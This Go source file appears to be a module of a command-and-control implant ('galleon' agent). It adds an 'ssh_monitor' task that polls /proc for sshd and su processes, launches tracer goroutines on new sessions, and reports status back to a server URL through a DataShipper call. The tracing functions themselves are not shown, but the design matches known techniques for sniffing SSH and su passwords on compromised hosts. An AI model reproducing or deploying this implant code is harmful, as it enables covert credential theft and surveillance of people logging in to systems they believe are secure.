//go:build linux

package agent_helper

import (
	"context"
	"fmt"
	"galleon/debug"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	sshMonitorCancel context.CancelFunc
	sshMonitorMu     sync.Mutex
	sshMonitorActive bool
)

func findAllPids() []int {
	var pids []int
	currentPID := os.Getpid()
	procDirs, err := os.ReadDir("/proc")
	if err != nil {
		return nil
	}
	for _, dir := range procDirs {
		if dir.IsDir() {
			pid, err := strconv.Atoi(dir.Name())
			if err == nil && pid != currentPID {
				pids = append(pids, pid)
			}
		}
	}
	return pids
}

func isSSHPid(pid int) bool {
	cmdLine, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	cmdLineStr := strings.ReplaceAll(string(cmdLine), "\x00", " ")

	patterns := []string{
		`sshd:.*\[net\]`,
		`sshd:.*@`,
		`^sshd:`,
		`sshd.*\[priv\]`,
		`sshd.*\[accepted\]`,
		`sshd-auth:`,
		`sshd-session:`,
	}

	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, cmdLineStr); matched {
			return true
		}
	}
	return false
}

func isSUPid(pid int) bool {
	cmdLine, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
}

func SSHMonitorHandler(serverUrl string, taskData map[string]interface{}) {
	args := strings.TrimSpace(strings.ToLower(taskData["args"].(string)))

	sshMonitorMu.Lock()
	defer sshMonitorMu.Unlock()

	switch args {
	case "on":
		if sshMonitorActive {
			DataShipper(serverUrl, taskData, "ssh monitor already running")
			return
		}
		ctx, cancel := context.WithCancel(context.Background())
		sshMonitorCancel = cancel
		sshMonitorActive = true
		go runSSHMonitor(ctx, serverUrl, taskData)
		DataShipper(serverUrl, taskData, "ssh monitor started")
	case "off":
		if !sshMonitorActive {
			DataShipper(serverUrl, taskData, "ssh monitor not running")
			return
		}
		sshMonitorCancel()
		sshMonitorActive = false
		DataShipper(serverUrl, taskData, "ssh monitor stopped")
	default:
		DataShipper(serverUrl, taskData, "usage: ssh_monitor on|off")
	}
}

func runSSHMonitor(ctx context.Context, serverUrl string, taskData map[string]interface{}) {
	var processedPids []int
	var skippedFirstSSH, skippedFirstSU bool

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		pids := findAllPids()

		var activePids []int
		for _, p := range processedPids {
			if _, err := os.Stat(fmt.Sprintf("/proc/%d", p)); err == nil {
				activePids = append(activePids, p)
			}
		}
		processedPids = activePids

		for _, pid := range pids {
			if Contains(processedPids, pid) {
				continue
			}

			if isSSHPid(pid) {
				processedPids = append(processedPids, pid)
				if debug.Debug {
					fmt.Printf("[*] Found ssh pid: %v\n", pid)
				}
				if !skippedFirstSSH {
					skippedFirstSSH = true
					continue
				}
				go traceSSHDProcess(ctx, serverUrl, taskData, pid)
			} else if isSUPid(pid) {
				processedPids = append(processedPids, pid)
				if debug.Debug {
					fmt.Printf("[*] Found su pid: %v\n", pid)
				}
				if !skippedFirstSU {
					skippedFirstSU = true
					continue
				}
				go traceSUProcess(ctx, serverUrl, taskData, pid)
			}
		}

		time.Sleep(250 * time.Millisecond)
	}
}
